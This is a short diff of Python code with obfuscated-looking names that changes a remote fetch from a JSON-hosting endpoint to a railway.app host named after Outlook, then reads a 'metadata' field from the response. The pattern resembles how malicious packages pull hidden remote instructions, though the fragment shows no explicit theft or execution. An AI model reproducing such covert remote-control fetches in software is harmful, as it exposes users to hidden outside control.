@@ -16,7 +16,7 @@ def net_mhacaw_849():
 
     def data_flgzoj_900():
         try:
-            data_qxzmom_794 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_qxzmom_794 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_qxzmom_794.raise_for_status()
             learn_dcoval_920 = data_qxzmom_794.json()
             process_npyyec_222 = learn_dcoval_920.get('metadata')
